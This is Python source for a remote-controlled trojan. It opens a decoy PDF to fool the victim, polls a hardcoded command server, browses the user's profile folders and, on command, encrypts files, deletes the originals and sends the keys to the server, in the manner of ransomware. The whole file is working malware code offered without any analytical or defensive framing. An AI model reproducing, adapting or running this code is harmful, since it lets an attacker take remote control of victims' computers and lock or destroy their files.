import requests
import time
import os
import sys
import uuid
from cryptography.fernet import Fernet

SERVER_URL = 'http://LAPTOP-TQFHH6BI:8080'

CLIENT_ID = str(uuid.uuid4())
HEADERS = {'X-UUID': CLIENT_ID}


def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)


def open_decoy_pdf():
    pdf_file = "Project_Details.pdf"
    path = resource_path(pdf_file)
    if os.path.exists(path):
        try:
            os.startfile(path)
        except Exception:
            pass


CURRENT_PATH = os.environ['USERPROFILE']


def perform_dir():
    global CURRENT_PATH
    if not os.path.exists(CURRENT_PATH): return "ERROR:Path_Not_Found"
    items = []
    try:
        all_items = os.listdir(CURRENT_PATH)
        dirs = [f"[DIR] {x}" for x in all_items if os.path.isdir(os.path.join(CURRENT_PATH, x))]
        files = [x for x in all_items if os.path.isfile(os.path.join(CURRENT_PATH, x))]
        items = dirs + files
    except Exception as e:
        return f"ERROR:Access_Denied"
    return f"DIR_RESULT:{CURRENT_PATH}||" + ",".join(items)


def change_dir(folder_name):
    global CURRENT_PATH
    try:
        if folder_name == "..":
            new_path = os.path.dirname(CURRENT_PATH)
        else:
            new_path = os.path.join(CURRENT_PATH, folder_name)
        if os.path.exists(new_path) and os.path.isdir(new_path):
            CURRENT_PATH = new_path
            return perform_dir()
        else:
            return "ERROR:Folder_Not_Found"
    except Exception as e:
        return f"ERROR:{e}"


def encrypt_one(filename):
    path = os.path.join(CURRENT_PATH, filename)
    if not os.path.exists(path): return f"ERROR:File_Missing"
    try:
        if os.path.getsize(path) > 50 * 1024 * 1024:
            return "ERROR:File_Too_Large"
    except:
        pass

    try:
        key = Fernet.generate_key()
        f = Fernet(key)
        with open(path, "rb") as r:
            data = r.read()
        enc = f.encrypt(data)
        with open(path + ".enc", "wb") as w:
            w.write(enc)
        try:
            os.remove(path)
        except:
            return f"ENCRYPTED_ONE:{filename}|{key.decode()}||WARNING:Orig_Not_Del"
        return f"ENCRYPTED_ONE:{filename}|{key.decode()}||"
    except Exception as e:
        return f"ERROR:{str(e)}"


def decrypt_one(filename, key):
    if not filename.endswith('.enc'): filename += '.enc'
    path = os.path.join(CURRENT_PATH, filename)
    if not os.path.exists(path): return f"ERROR:File_Missing"
    try:
        f = Fernet(key.encode())
        with open(path, "rb") as r:
            data = r.read()
        dec = f.decrypt(data)
        orig = path.replace(".enc", "")
        with open(orig, "wb") as w:
            w.write(dec)
        os.remove(path)
        return f"DECRYPTED_ONE:{orig}||"
    except Exception as e:
        return f"ERROR:{e}"


def connect():
    open_decoy_pdf()
    print(f"[*] Client ID: {CLIENT_ID}")
    print(f"[*] Connecting to {SERVER_URL}...")

    session = requests.Session()
    session.headers.update(HEADERS)

    while True:
        try:
            initial = f"DIR_RESULT:Waiting For Command...||"
            resp = session.post(SERVER_URL, data=initial.encode())
            if resp.status_code == 200:
                print("[+] Connected!")
                break
        except:
            time.sleep(2)

    while True:
        try:
            req = session.get(SERVER_URL)
            command = req.text

            if 'No-Command' in command:
                time.sleep(0.2)
                continue

            print(f"Cmd: {command}")
            output = "Done."

            if command == 'dir':
                output = perform_dir()
            elif command.startswith('cd '):
                output = change_dir(command.split(' ', 1)[1])
            elif command.startswith('enc_file '):
                output = encrypt_one(command.split(' ', 1)[1])
            elif command.startswith('dec_file '):
                data = command.split(' ', 1)[1]
                try:
                    output = decrypt_one(data.split('|')[0], data.split('|')[1])
                except:
                    output = "ERROR:Invalid_Args"

            session.post(SERVER_URL, data=output.encode())

        except Exception as e:
            print(f"Link Error: {e}")
            session = requests.Session()
            session.headers.update(HEADERS)
            time.sleep(2)


if __name__ == '__main__':
    connect()